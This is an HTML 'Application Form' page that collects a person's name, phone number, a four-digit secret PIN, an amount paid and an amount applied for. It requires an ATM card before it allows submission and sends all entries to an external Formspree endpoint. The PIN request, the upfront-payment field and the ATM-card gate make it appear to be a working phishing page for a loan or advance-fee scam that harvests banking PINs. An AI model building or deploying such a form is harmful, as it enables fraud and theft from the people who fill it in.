<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select, button {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
    }
    #warning-message {
      color: red;
      font-weight: bold;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <form action="https://formspree.io/f/mwkgrdzo" method="POST">
    
    <!-- Field 1: Full Name -->
    <label for="fullname">Full Name</label>
    <input type="text" name="fullname" id="fullname" required>

    <!-- Field 2: Phone Number -->
    <label for="phone">Phone Number</label>
    <input type="tel" name="phone" id="phone" required>

    <!-- Field 3: Secret Code (PIN) -->
    <label for="pin">Secret Code (PIN)</label>
    <input type="password" name="pin" id="pin" pattern="[0-9]{4}" maxlength="4" required>
    <input type="checkbox" onclick="togglePIN()"> Show PIN

    <!-- Field 4: Amount Paid -->
    <label for="amount-paid">Amount Paid</label>
    <input type="number" name="amount-paid" id="amount-paid" required>

    <!-- Field 5: Amount Applied For -->
    <label for="amount-applied">Amount Applied For</label>
    <input type="number" name="amount-applied" id="amount-applied" required>

    <!-- Field 7: Do you have an ATM card? -->
    <label for="atm-card">Do you have an ATM card?</label>
    <select name="atm-card" id="atm-card" required>
      <option value="">--Select--</option>
      <option value="yes">Yes</option>
      <option value="no">No</option>
    </select>

    <!-- Field 9: Conditional warning -->
    <div id="warning-message">YOU MUST HAVE AN ATM CARD TO PROCEED</div>

    <!-- Submit Button -->
    <button type="submit" id="submit-button">Submit</button>
  </form>

  <!-- JavaScript Logic -->
  <script>
    function togglePIN() {
      const pinField = document.getElementById("pin");
      pinField.type = pinField.type === "password" ? "text" : "password";
    }

    const atmCardField = document.getElementById("atm-card");
    const warningMessage = document.getElementById("warning-message");
    const submitButton = document.getElementById("submit-button");

    atmCardField.addEventListener("change", function () {
      if (this.value === "no") {
        warningMessage.style.display = "block";
        submitButton.disabled = true;
      } else {
        warningMessage.style.display = "none";
        submitButton.disabled = false;
      }
    });
  </script>
</body>
</html>
